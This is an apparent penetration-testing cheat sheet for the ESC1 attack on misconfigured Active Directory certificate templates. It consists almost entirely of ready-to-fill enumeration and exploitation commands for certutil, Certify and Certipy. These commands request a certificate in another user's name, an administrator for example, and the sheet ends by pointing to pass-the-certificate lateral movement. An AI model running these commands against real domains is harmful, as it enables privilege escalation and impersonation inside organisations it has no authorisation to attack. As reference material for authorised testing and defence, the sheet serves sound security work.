# ESC1 - Misconfigured Certificate Templates

## Enumeration

 - certutil -v -dsTemplate

 - certify.exe find [/vulnerable]

 - certipy find -u USER@DOMAIN -p PASSWORD -dc-ip DOMAIN_CONTROLLER

## Exploitation

 - certipy req -u USER@DOMAIN -p PASSWORD -target CA_SERVER -template 'VULNERABLE_TEMPLATE_NAME' -ca CA_NAME -upn TARGET_USER@DOMAIN (Linux)

 - certify.exe request /ca:SERVER\CA_NAME /template:"VULNERABLE_TEMPLATE_NAME" [/altname:"Admin"] (Windows)

### With this attack, we now perform Pass the Certificate Lateral Movement

